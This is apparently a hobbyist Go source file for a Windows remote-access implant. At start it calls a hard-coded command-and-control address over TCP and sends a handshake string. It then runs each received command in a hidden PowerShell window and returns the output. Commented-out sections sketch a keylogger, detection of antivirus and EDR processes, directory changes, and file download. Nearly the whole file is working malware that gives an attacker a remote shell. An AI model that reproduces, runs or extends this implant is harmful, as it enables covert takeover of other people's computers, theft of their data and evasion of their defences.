package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
	//"github.com/MarinX/keylogger"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	if *attempts > 3 {
		terminate()
	}
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		*attempts = *attempts + 1
		time.Sleep(10 * time.Second)
		return addr, false
	}
	addr.Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
	*attempts = 0
	return addr, true
}

func listen4Commands(conn *net.Conn) string {
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	return command
}

func executeCommands(conn *net.Conn, command *string) {
	if *command == "stop\n" {
		terminate()
	}
	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	ps_instance := exec.Command(powershellPath, "/c", *command)
	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
	output, err := ps_instance.Output()
	if err != nil {
		output = []byte("Couldn't execute the command\n")
		fmt.Println("Couldnt Execute the command")
	}
	// if len(output) <= 1 {
	// 	output = []byte("Couldn't execute the command\n")
	// 	fmt.Println(output)
	// }
	//fmt.Println(output)
	(*conn).Write(output)
}

// func checkSec() []string {
// 	products := []string{}
// 	procs, err := process.GetProcesses()
// 	if err != nil {
// 		fmt.Println("Couldn't Get Processes")
// 	}
// 	for index := range procs {
// 		if procs[index].Exe == "MsMpEng.exe" {
// 			products = append(products, "Defender")
// 		}
// 		if procs[index].Exe == "CSFalconService.exe" {
// 			products = append(products, "CrowdStrike")
// 		}
// 	}
// 	return products
// }

// func logger(conn *net.Conn) { //This only works within the context of the current window
// 	buffer := make([]byte, 12)
// 	if err := keyboard.Open(); err != nil {
// 		panic(err)
// 	}
// 	defer func() {
// 		_ = keyboard.Close()
// 	}()
// 	fmt.Println(len(buffer))
// 	for i := 0; i < len(buffer); i++ {
// 		char, _, err := keyboard.GetKey()
// 		if err != nil {
// 			panic(err)
// 		}
// 		buffer[i] = byte(char)
// 		//fmt.Printf("You pressed: rune %q", char)
// 	}
// 	(*conn).Write([]byte(buffer))
// 	(*conn).Write([]byte("\n"))
// }

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

func listen4Commands2(conn *net.Conn, c1 chan string) {
	request := make([]byte, 32)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	c1 <- command
}

// func cd(conn *net.Conn, command *string, pImplantWD *string) bool {
// 	regexCD := regexp.MustCompile(`cd\s+.+`)
// 	matchCD := regexCD.FindString(*command)
// 	if matchCD != "" {
// 		dir2go := strings.Split(matchCD, " ")[1]
// 		// implantWD := os.Chdir(dir2go)
// 		if os.Chdir(dir2go) != nil {
// 			(*conn).Write([]byte("Error getting the dir\n"))
// 		} else {
// 			*pImplantWD, _ = os.Getwd()
// 		}
// 		return true
// 	}
// 	return false
// }

func ls(conn *net.Conn, implantWD *string) {
	dirFS, _ := os.ReadDir(*implantWD)
	dirListing := ""
	for e := range dirFS {
		dirInfo, _ := dirFS[e].Info()
		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
	}
	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
		"		----		" + "----		" + "	----" + "\n" +
		dirListing + "\n")) //Looks funky but I want it organized
}

// func download(conn *net.Conn, implantWD *string, file string) {
// 	openFile, err := os.Open(file)
// 	if err != nil {
// 		panic(err)
// 	}
// 	contentsFile, err := os.ReadFile(file)
// 	if err != nil {
// 		panic(err)
// 	}
// 	net.TCPAddr
// 	(*conn).Write([]byte(contentsFile))

// }

func main() {
	c2Address := "192.168.1.13:400"
	attempts := 0
	//implantWD, _ := os.Getwd()
	fmt.Println("Implant Started")
	conn, result := callHome(&c2Address, &attempts)
	for !result {
		conn, result = callHome(&c2Address, &attempts)
	}
	for { //Main Program Loop
		//conn.Write([]byte("MoTerpreter $ "))
		command := listen4Commands(&conn)
		fmt.Println(command)
		if command == "AreYouAlive\n" {
			fmt.Println("IAMALIVE")
			conn.Write([]byte("IAMALIVE"))
			continue
		}
		executeCommands(&conn, &command)
	}
}
